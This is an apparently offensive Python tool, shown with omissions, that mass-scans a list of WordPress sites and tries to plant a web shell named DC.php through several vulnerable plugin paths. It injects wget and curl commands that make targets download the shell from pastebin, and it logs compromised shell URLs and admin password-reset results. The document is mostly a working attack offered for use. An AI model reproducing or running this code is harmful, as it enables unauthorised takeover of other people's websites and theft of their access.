...
try:
  ...
  pass
if os.name == 'nt':
  os.system('cls && title "DC 0day Exploit wordpress "')
else:
  os.system('clear')
t = []
...
def move(url, filename):
  ...
  if r.status_code == 200:
    print ("\033[92m [*] Boom > %s/wp-content/uploads/simple-file-list/DC.php"%url)
    open('shells_wp.txt','a').write(url + "/wp-content/uploads/simple-file-list/DC.php\n")
  else:
    print ('\033[91m[-] Failed :' + url)
  return new_filename
def uploadshell(i):
  m = 'wget https://pastebin.com/raw/ifv9baUH -O DC.php'
  m2 = 'curl -O https://pastebin.com/raw/LqvpBAka;mv EiKvkrJp DC.php'
  ...
  if 'Escanor0xtn' in r:
    print("\033[92m [*] Boom > %s/wp-content/plugins/wp-file-manager/lib/files/DC.php"%i)
    open('Results/shells.txt', 'a').write(i + "/wp-content/plugins/wp-file-manager/lib/files/DC.php\n")
...
def exploit(i):
  try:
    if wp(i):  # check if site=wordpress or no +plugin
      print("\033[92m" + i + " ==>\033[93m Wordpress plugins Found ")
      open('Results/wordpress.txt', 'a').write(i + '\n')
      ...
      for exp in ['/wordpress/wp-content/plugins/ez-done-file-manager/admin.php','/wordpress/wp-content/admin/views/tool-file-editor.php']:
          shelllll=i+exp.replace(exp.split('/')[5],'DC.php')
          ...
          if 'Escanor0xtn' in rere:
            ...
            open('Results/shells.txt', 'a').write(shelllll+"\n")
      upload(i, filename[1])
      try:
        rea=requests.post(i+'/vendor/woocommerce/action-scheduler/classes/abstracts/ActionScheduler_Abstract_ListTable.php',headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'},data={'row_id':'wget https://pastebin.com/raw/uhmkCsAr -O DC.php'},timeout=10)
        ...
        if "debug_log.txt" in rea:
          ...
          if ezrze:
            ...
            if ee:
              ...
              open('Results/admin_resetpaswd.txt', 'a').write(i+'/wp-login.php'+ee+"\n")
      except:
        pass
      try:
        ...
        if requests.get(url).status_code==200:
            ...
            if "0xtn" in requests.get(i+'DC.php').text:
                print ("\033[92m [*] Boom > %s/DC.php"%i)
                open('Results/shells.txt', 'a').write(i+'/DC.php\n')
      except:
        pass
    else:
      print("\033[92m" + i + " ==>\033[91m Failed upload shells  ")
      pass
  except:
    print("\033[92m" + i + " ==>\033[91m Not vuln Wordpress plugins Not found  ")
    pass
print("""\033[93m
   ___      _               ______            _       _ _   
  / _ \    | |             |  ____|          | |     (_) |  
...
{b}[{a}1{b}]{a} Run Exploit
""".format(a="\033[93m", b="\033[92m"))
i5tar=input('Select : ')
sites = open(input('List : '), 'r').read().splitlines()
...
if i5tar=='1':
 ...
 exit(input('Error [press enter to exit]'))
